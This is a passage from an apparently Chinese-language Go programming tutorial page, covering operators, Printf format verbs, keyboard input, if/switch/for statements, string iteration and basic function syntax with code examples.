<td>(A!&#x3D;B)为True</td>
</tr>
<tr>
<td>&gt;</td>
<td>检查左边值是否大于右边值，如果是返回True否则返回 False</td>
<td>(A&gt;B)为False</td>
</tr>
<tr>
<td>&lt;</td>
<td>检查左边值是否小于右边值，如果是返回True否则返回 False</td>
<td>(A&lt;B)为True</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>检查左边值是否大于等于右边值，如果是返回True否则返回 False</td>
<td>(A&gt;&#x3D;B)为 False</td>
</tr>
<tr>
<td>&lt;&#x3D;</td>
<td>检查左边值是否小于等于右边值，如果是返回True否则返回 False</td>
<td>(A&lt;&#x3D;B)为True</td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="type">int</span> = <span class="number">20</span></span><br><span class="line">	fmt.Println(a &gt; b)  <span class="comment">// false</span></span><br><span class="line">	fmt.Println(a &lt; b)  <span class="comment">// true</span></span><br><span class="line">	fmt.Println(a == b) <span class="comment">// false</span></span><br><span class="line">	fmt.Println(a != b) <span class="comment">// true</span></span><br><span class="line">	fmt.Println(a &gt;= b) <span class="comment">// false</span></span><br><span class="line">	fmt.Println(a &lt;= b) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="逻辑运算符">1.1.4.3. 逻辑运算符</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a <span class="type">bool</span> = <span class="literal">false</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	fmt.Println(a &amp;&amp; b)    <span class="comment">// false</span></span><br><span class="line">	fmt.Println(a || b)    <span class="comment">// true</span></span><br><span class="line">	fmt.Println(!(a &amp;&amp; b)) <span class="comment">// true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="位运算符">1.1.4.4. 位运算符</h4><p>Go语言支持的位运算符如下表所示。假定A为60，B 为13:</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>按位与运算符”&amp;”是双目运算符。都是1结果为1，否则是0</td>
<td>(A &amp; B)结果为12,二进制为 0000 1100</td>
</tr>
<tr>
<td>|</td>
<td>按位或运算符””是双目运算符。 都是0结果为0，否则是1</td>
<td>(A | B)结果为 61,二进制为 0011 1101</td>
</tr>
<tr>
<td>^</td>
<td>按位异或运算符”^“是双目运算符。 不同则为1，相同为0</td>
<td>(A ^ B)结果为49, 二进制为00110001</td>
</tr>
<tr>
<td>&amp;^</td>
<td>位清空，a &amp;^b，对于b上的每个数值，如果为0，则取a对应位上的数值，如果为1，则取0.</td>
<td>(A &amp;^ B)结果为48, 二进制为 00110000</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移运算符”&lt;&lt;”是双目运算符。左移n位就是乘以2的n次方。其功能把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td>A &lt;&lt; 2结果为240, 二进制为 11110000</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移运算符“&gt;&gt;”是双目运算符。右移n位就是除以2的n次方。其功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。</td>
<td>A &gt;&gt; 2结果为15, 二进制为0000 1111</td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a <span class="type">int</span> = <span class="number">60</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="type">int</span> = <span class="number">13</span></span><br><span class="line">	<span class="comment">// 60 0011 1100</span></span><br><span class="line">	<span class="comment">// 13 0000 1101</span></span><br><span class="line">	<span class="comment">// &amp; 两个都为1结果才为1,否则为0</span></span><br><span class="line">	c := a &amp; b</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c) <span class="comment">// %b 表示 二进制</span></span><br><span class="line">	<span class="comment">// |  两个都是0结果为0，否则是1</span></span><br><span class="line">	c = a | b</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c)</span><br><span class="line">	<span class="comment">// &amp;^对于b上的每个数值，如果为0，则取a对应位上的数值，如果为1，则取0</span></span><br><span class="line">	c = a &amp;^ b</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c)</span><br><span class="line">	<span class="comment">// ^ 不同则为1，相同为0</span></span><br><span class="line">	c = a ^ b</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c)</span><br><span class="line">	<span class="comment">// &lt;&lt; 往左移两位</span></span><br><span class="line">	c = a &lt;&lt; <span class="number">2</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c)</span><br><span class="line">	a = <span class="number">60</span></span><br><span class="line">	c = a &gt;&gt; <span class="number">2</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d,二进制:%b\n&quot;</span>, c, c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221117213427409.png" alt="image-20221117213427409">从</p>
<h4 id="赋值运算符">1.1.4.5. 赋值运算符</h4><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>简单的赋值运算符，将一个表达式的值赋给一个左值</td>
<td>C&#x3D;A+B将A+B表达式结果赋值给 C</td>
</tr>
<tr>
<td>+&#x3D;</td>
<td>相加后再赋值</td>
<td>C+&#x3D; A等于C&#x3D;C+A</td>
</tr>
<tr>
<td>-&#x3D;</td>
<td>相减后再赋值</td>
<td>C-&#x3D;A等于C&#x3D;C-A</td>
</tr>
<tr>
<td>*&#x3D;</td>
<td>相乘后再赋值</td>
<td>C*&#x3D;A等于C&#x3D;C*A</td>
</tr>
<tr>
<td>&#x2F;&#x3D;</td>
<td>相除后再赋值</td>
<td>C&#x2F;&#x3D;A等于C&#x3D;C&#x2F;A</td>
</tr>
<tr>
<td>%&#x3D;</td>
<td>求余后再赋值</td>
<td>C%&#x3D;A等于C&#x3D;C%A</td>
</tr>
<tr>
<td>&lt;&lt;&#x3D;</td>
<td>左移后赋值</td>
<td>C&lt;&lt;&#x3D;2等于C&#x3D; C&lt;&lt;2</td>
</tr>
<tr>
<td>&gt;&gt;&#x3D;</td>
<td>右移后赋值</td>
<td>C&gt;&gt;&#x3D; 2等于C&#x3D; C&gt;&gt;2</td>
</tr>
<tr>
<td>&amp;&#x3D;</td>
<td>按位与后赋值</td>
<td>C&amp;&#x3D;2等于C&#x3D;C&amp;2</td>
</tr>
<tr>
<td>^&#x3D;</td>
<td>按位异或后赋值</td>
<td>C^&#x3D; 2等于C&#x3D; C^2</td>
</tr>
<tr>
<td>|&#x3D;</td>
<td>按位或后赋值</td>
<td>C|&#x3D;2等于C&#x3D;C|2</td>
</tr>
</tbody></table>
<h3 id="键盘输入输出">1.1.5. 键盘输入输出</h3><table>
<thead>
<tr>
<th>fmt.Scanf()  接收输入 格式化输入 区别&#x3D;&gt;只接受format内指定的参数类型</th>
</tr>
</thead>
<tbody><tr>
<td><strong>fmt.Scanln() 接收输入 区别&#x3D;&gt;间隔的数只能通过空格分隔，只能在同一行输入</strong></td>
</tr>
<tr>
<td><strong>fmt.Scan()   接收输入 区别&#x3D;&gt;间隔的数可以通过空格、换行分隔</strong></td>
</tr>
</tbody></table>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> y <span class="type">float64</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;请输入两个数1、整数 2、浮点数&quot;</span>)</span><br><span class="line">	<span class="comment">// 接受x y的地址</span></span><br><span class="line">	<span class="comment">// go语言中存在指针，指向内存地址，可以直接通过修改指针去修改变量2 2</span></span><br><span class="line">	fmt.Scan(&amp;x, &amp;y) <span class="comment">// Scan等待键盘输入</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;x:&quot;</span>, x)</span><br><span class="line">	fmt.Println(<span class="string">&quot;y:&quot;</span>, y)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//fmt.Scanf()  接收输入 格式化输入 区别=&gt;只接受format内指定的参数类型</span></span><br><span class="line">	<span class="comment">//fmt.Scanln() 接收输入 区别=&gt;间隔的数只能通过空格分隔，只能在同一行输入</span></span><br><span class="line">	<span class="comment">//fmt.Scan()   接收输入 区别=&gt;间隔的数可以通过空格、换行分隔</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119103108953.png" alt="image-20221119103108953"></p>
<h3 id="占位符">1.1.6. 占位符</h3><ul>
<li>普通占位符</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%v</td>
<td>相应值的默认格式</td>
<td>Printf(“%v”, people)</td>
<td>{zhangsan}</td>
</tr>
<tr>
<td>%+v</td>
<td>打印结构体时，会添加字段名</td>
<td>Printf(“%+v”, people)</td>
<td>{Name:zhangsan}</td>
</tr>
<tr>
<td>%#v</td>
<td>相应值的Go语法表示</td>
<td>Printf(“#v”, people)</td>
<td>main.Human{Name:“zhangsan”}</td>
</tr>
<tr>
<td>%T</td>
<td>相应值的类型的Go语法表示</td>
<td>Printf(“%T”, people)</td>
<td>main.Human</td>
</tr>
<tr>
<td>%%</td>
<td>字面上的百分号，并非值的占位符</td>
<td>Printf(“%%”)</td>
<td>%</td>
</tr>
</tbody></table>
<ul>
<li>布尔占位符</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%t</td>
<td>true 或 false</td>
<td>Printf(“%t”, true)</td>
<td>true</td>
</tr>
</tbody></table>
<ul>
<li>整数占位符</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%b</td>
<td>二进制表示</td>
<td>Printf(“%b”, 5)</td>
<td>101</td>
</tr>
<tr>
<td>%c</td>
<td>相应Unicode码点所表示的字符</td>
<td>Printf(“%c”, 0x4E2D)</td>
<td>中</td>
</tr>
<tr>
<td>%d</td>
<td>十进制表示</td>
<td>Printf(“%d”, 0x12)</td>
<td>18</td>
</tr>
<tr>
<td>%o</td>
<td>八进制表示</td>
<td>Printf(“%d”, 10)</td>
<td>12</td>
</tr>
<tr>
<td>%q</td>
<td>单引号围绕的字符字面值， 由Go语法安全地转义</td>
<td>Printf(“%q”, 0x4E2D)</td>
<td>‘中’</td>
</tr>
<tr>
<td>%x</td>
<td>十六进制表示，字母形式为小写 a-f</td>
<td>Printf(“%x”, 13)</td>
<td>d</td>
</tr>
<tr>
<td>%X</td>
<td>十六进制表示，字母形式为大写 A-F</td>
<td>Printf(“%x”, 13)</td>
<td>D</td>
</tr>
<tr>
<td>%U</td>
<td>Unicode格式：U+1234，等同于 “U+%04X”</td>
<td>Printf(“%U”, 0x4E2D)</td>
<td>U+4E2D</td>
</tr>
</tbody></table>
<ul>
<li>浮点数和复数的组成部分（实部和虚部）</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%b</td>
<td>无小数部分的，指数为二的幂的科学计数法，与 strconv.FormatFloat 的 ‘b’ 转换格式一致。</td>
<td></td>
<td>-123456p-78</td>
</tr>
<tr>
<td>%e</td>
<td>科学计数法</td>
<td>Printf(“%e”, 10.2)</td>
<td>1.020000e+01</td>
</tr>
<tr>
<td>%E</td>
<td>科学计数法</td>
<td>Printf(“%e”, 10.2)</td>
<td>1.020000E+01</td>
</tr>
<tr>
<td>%f</td>
<td>有小数点而无指数</td>
<td>Printf(“%f”, 10.2)</td>
<td>10.200000</td>
</tr>
<tr>
<td>%g</td>
<td>根据情况选择 %e 或 %f</td>
<td>Printf(“%g”, 10.20)</td>
<td>10.2</td>
</tr>
<tr>
<td>%G</td>
<td>根据情况选择 %E 或 %f</td>
<td>Printf(“%G”, 10.20+2i)</td>
<td>(10.2+2i)</td>
</tr>
</tbody></table>
<ul>
<li>字符串与字节切片</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%s</td>
<td>输出字符串表示（string类型或[]byte)</td>
<td>Printf(“%s”, []byte(“Go语言”))</td>
<td>Go语言</td>
</tr>
<tr>
<td>%q</td>
<td>双引号围绕的字符串</td>
<td>Printf(“%q”, “Go语言”)</td>
<td>“Go语言”</td>
</tr>
<tr>
<td>%x</td>
<td>十六进制, 小写字母, 每字节两个字符</td>
<td>Printf(“%x”, “golang”)</td>
<td>676f6c616e67</td>
</tr>
<tr>
<td>%X</td>
<td>十六进制, 大写字母, 每字节两个字符</td>
<td>Printf(“%X”, “golang”)</td>
<td>676F6C616E67</td>
</tr>
</tbody></table>
<ul>
<li>指针</li>
</ul>
<table>
<thead>
<tr>
<th>占位符</th>
<th>说明</th>
<th>举例</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td>%p</td>
<td>十六进制表示，前缀 0x</td>
<td>Printf(“%p”, &amp;people)</td>
<td>0x4f57f0</td>
</tr>
</tbody></table>
<h2 id="流程控制">1.2. 流程控制</h2><h3 id="if">1.2.1. if</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件表达式&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> 条件表达式&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> score <span class="type">int</span> = <span class="number">22</span></span><br><span class="line">	<span class="keyword">if</span> score &gt;= <span class="number">90</span> &amp;&amp; score &lt;= <span class="number">100</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> score &gt;= <span class="number">80</span> &amp;&amp; score &lt; <span class="number">90</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> score &gt;= <span class="number">70</span> &amp;&amp; score &lt; <span class="number">80</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;C&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> score &gt;= <span class="number">60</span> &amp;&amp; score &lt; <span class="number">70</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;E&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119104332130.png" alt="image-20221119104332130"></p>
<h3 id="swith">1.2.2. swith</h3><ul>
<li>适用少量固定参数值的匹配情况，变量支持任何数据类型</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> var1 &#123;</span><br><span class="line"><span class="keyword">case</span> val1:</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">case</span> va12:</span><br><span class="line">	...</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> score <span class="type">int</span> = <span class="number">30</span></span><br><span class="line">	<span class="keyword">switch</span> score &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">90</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>fallthrough</strong> 穿透，判断结束后，不仅会执行本条语句，还会执行下一个case语句</li>
<li><strong>break</strong> 终止循环判断</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> score <span class="type">int</span> = <span class="number">90</span></span><br><span class="line">	<span class="keyword">switch</span> score &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">90</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">		<span class="keyword">fallthrough</span> <span class="comment">// fallthrough case穿透，会执行下一个case语句</span></span><br><span class="line">	<span class="keyword">case</span> <span class="number">60</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;F&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119125741330.png" alt="image-20221119125741330"></p>
<h3 id="for">1.2.3. for</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 定义变量;条件判断;控制变量自增或自减&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注意:</span><br><span class="line"><span class="number">1.</span>第三个参数可省略，放到主体里自增</span><br><span class="line"><span class="number">2.</span>三个参数都可省略变成无限循环</span><br></pre></td></tr></table></figure>

<ul>
<li><input disabled type="checkbox"> 计算1-10的数之和</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> sum = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++ &#123;</span><br><span class="line">		sum += i</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><input disabled type="checkbox"> 打印一个5*5的方阵</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* * * * *</span></span><br><span class="line"><span class="comment">* * * * *</span></span><br><span class="line"><span class="comment">* * * * *</span></span><br><span class="line"><span class="comment">* * * * *</span></span><br><span class="line"><span class="comment">* * * * *</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">5</span>; j++ &#123;</span><br><span class="line">			fmt.Print(<span class="string">&quot;* &quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><input disabled type="checkbox"> 打印九九乘法表</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= i; j++ &#123;</span><br><span class="line">			fmt.Printf(<span class="string">&quot;%d * %d = %d &quot;</span>, j, i, i*j)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119135732658.png" alt="image-20221119135732658"></p>
<ul>
<li>break，退出循环</li>
<li>continue结束当次循环</li>
</ul>
<h3 id="String">1.2.4. String</h3><ul>
<li><p>string字符串中的字符不能被修改</p>
</li>
<li><p><input disabled type="checkbox"> 
for循环遍历string字节</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> str <span class="type">string</span> = <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line">	<span class="comment">// 正常for循环</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;第%d个字符%c的int值为%d\n&quot;</span>, i+<span class="number">1</span>, str[i], str[i]) <span class="comment">// %c 代表字符</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;=================================&quot;</span>)</span><br><span class="line">	<span class="comment">// for range循环，遍历数组，切片</span></span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> str &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;第%d个字符%c的int值为%d\n&quot;</span>, i+<span class="number">1</span>, v, v) <span class="comment">// %c 代表字符</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119145725927.png" alt="image-20221119145725927"></p>
<h2 id="函数（func）">1.3. 函数（func）</h2><h3 id="函数的声明和调用">1.3.1. 函数的声明和调用</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function_name</span><span class="params">( [parameter list] )</span></span> [return_types] &#123;</span><br><span class="line">	函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(add(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	c := a + b</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119151810857.png" alt="image-20221119151810857"></p>
<ul>
<li><p>无参无返回值函数</p>
</li>
<li><p>有一个参数的函数</p>
</li>
<li><p>有两个参数的函数</p>
</li>
<li><p>有一个返回值的函数</p>
</li>
<li><p>有多个返回值的函数</p>
</li>
</ul>
<h3 id="形式参数和实际参数">1.3.2. 形式参数和实际参数</h3><ul>
<li>形式参数: 定义函数时，用来接收外部传入数据的参数，就是形式参数 &#x3D;&gt; a和b</li>
<li>实际参数: 调用函数时，传给形参的实际数据叫做实际参数 &#x3D;&gt; 1和2</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 形式参数: 定义函数时，用来接收外部传入数据的参数，就是形式参数 =&gt; a和b</span></span><br><span class="line">	<span class="comment">// 实际参数: 调用函数时，传给形参的实际数据叫做实际参数 =&gt; 1和2</span></span><br><span class="line">	fmt.Print(Max(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Max</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> result <span class="type">int</span></span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		result = a</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		result = b</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="可变参数">1.3.3. 可变参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">num ...[type]</span><br></pre></td></tr></table></figure>

<p>概念:一个函数的参数类型确定，但个数不确定，就可以使用可变参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Print(GetSum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetSum</span><span class="params">(num ...<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// ...可变参数</span></span><br><span class="line">	sum := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(num); i++ &#123;</span><br><span class="line">		sum += num[i]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum</span><br><span 